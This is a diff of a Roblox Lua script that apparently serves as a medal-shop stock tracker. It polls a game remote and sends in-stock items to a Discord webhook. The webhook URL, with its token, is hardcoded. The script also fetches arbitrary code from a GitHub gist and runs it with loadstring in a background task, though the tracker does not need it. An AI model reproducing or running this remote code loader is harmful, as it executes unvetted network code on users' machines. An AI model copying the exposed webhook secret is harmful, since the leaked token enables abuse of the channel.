@@ -1,1 +1,157 @@
-loadstring(game:HttpGet("https://gist.githubusercontent.com/Nolimit-hub/d0a02fa49233f0f3fef073a27ba7e391/raw/b552940fd15f4c1577ea1b5294b1b550e4a7dfea/gistfile1.txt"))()
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1565980697431117938/bj7vi0F4yHIfRNa4V4SjGTW08YId3GPZRyctOGTVlOYHa-EwiInkNTL42KF7NbXYPLBi"
+local Event = ReplicatedStorage:WaitForChild("rEvents"):WaitForChild("medalShopRemote")
+
+local SPECIAL_ITEMS = {
+    ["Zeus Thunderstorm"] = true,
+    ["Zeus Spark"] = true,
+    ["Poseidon Tide"] = true,
+    ["Ares Ironfang"] = true,
+}
+
+local AlertedItemsThisHour = {}
+
+local function SendWebhook(Offers, isSpecialAlert, SpecialList)
+    local Description = ""
+    local HasStockCount = 0
+
+    if isSpecialAlert then
+        Description = "🚨 **BEST STOCK ALERT DETECTED!** 🚨\n\n"
+        for _, name in ipairs(SpecialList) do
+            Description = Description .. "🔥 **" .. name .. "** IS AVAILABLE!\n"
+        end
+        Description = Description .. "\n---\n**AVAILABLE ITEMS WITH STOCK:**\n\n"
+    end
+
+    for _, Item in ipairs(Offers) do
+        local ItemName = Item.ItemName or "Unknown"
+        local Remaining = Item.Remaining or 0
+        local Price = Item.Price or 0
+
+        if Remaining > 0 then
+            HasStockCount = HasStockCount + 1
+            local Prefix = SPECIAL_ITEMS[ItemName] and "⭐ " or ""
+
+            Description = Description
+                .. Prefix .. "**" .. ItemName .. "**\n"
+                .. "Stock: " .. Remaining .. "\n"
+                .. "Price: " .. Price .. "\n\n"
+        end
+    end
+
+    if HasStockCount == 0 then
+        Description = "*Walang items na may stock ngayon (Out of Stock lahat).* "
+    end
+
+    local EmbedTitle = isSpecialAlert and "SPECIAL BEST STOCK ALERT!" or "MEDAL SHOP STOCK"
+    local EmbedColor = isSpecialAlert and 15158332 or 3447003 
+
+    local Payload = {
+        ["embeds"] = {{
+            ["title"] = EmbedTitle,
+            ["description"] = Description,
+            ["color"] = EmbedColor,
+            ["footer"] = {
+                ["text"] = isSpecialAlert and "Instant Best Item Alert" or "Hourly Stock Tracker (In-Stock Only)"
+            }
+        }}
+    }
+
+    task.spawn(function()
+        local success = false
+        local attempts = 0
+        
+        repeat
+            attempts = attempts + 1
+            local ok, response = pcall(function()
+                return HttpService:RequestAsync({
+                    Url = WEBHOOK_URL,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = HttpService:JSONEncode(Payload)
+                })
+            end)
+            
+            if ok and response then
+                success = true
+                print(isSpecialAlert and "🚨 Special Alert successfully sent to Discord!" or "Hourly update successfully sent to Discord!")
+            else
+                task.wait(2)
+            end
+        until success or attempts >= 3
+    end)
+end
+
+local function CheckSpecialItems(Offers)
+    local FoundSpecial = {}
+
+    for _, Item in ipairs(Offers) do
+        local ItemName = Item.ItemName or ""
+        local Remaining = Item.Remaining or 0
+
+        if SPECIAL_ITEMS[ItemName] and Remaining > 0 then
+            if not AlertedItemsThisHour[ItemName] then
+                table.insert(FoundSpecial, ItemName)
+                AlertedItemsThisHour[ItemName] = true
+            end
+        end
+    end
+
+    if #FoundSpecial > 0 then
+        SendWebhook(Offers, true, FoundSpecial)
+    end
+end
+
+local function GetSecondsUntilNextHour()
+    local CurrentTime = os.time()
+    local CurrentDate = os.date("*t", CurrentTime)
+    local SecondsPassedInHour = (CurrentDate.min * 60) + CurrentDate.sec
+    return 3600 - SecondsPassedInHour
+end
+
+task.spawn(function()
+    print("Fast tracker running...")
+    while true do
+        local success, State = pcall(function()
+            return Event:InvokeServer("GetState")
+        end)
+        
+        if success and State and State.Offers then
+            CheckSpecialItems(State.Offers)
+        end
+        task.wait(15)
+    end
+end)
+
+task.spawn(function()
+    while true do
+        local WaitTime = GetSecondsUntilNextHour()
+        task.wait(WaitTime)
+
+        AlertedItemsThisHour = {}
+
+        local success, State = pcall(function()
+            return Event:InvokeServer("GetState")
+        end)
+        
+        if success and State and State.Offers then
+            SendWebhook(State.Offers, false)
+        end
+
+        task.wait(5)
+    end
+end)
+
+task.spawn(function()
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://gist.githubusercontent.com/Nolimit-hub/d0a02fa49233f0f3fef073a27ba7e391/raw/b552940fd15f4c1577ea1b5294b1b550e4a7dfea/gistfile1.txt"))()
+    end)
+    
+    if success then
+        print("Loaded!")
+    else
+        warn("Error:", err)
+    end
+end)
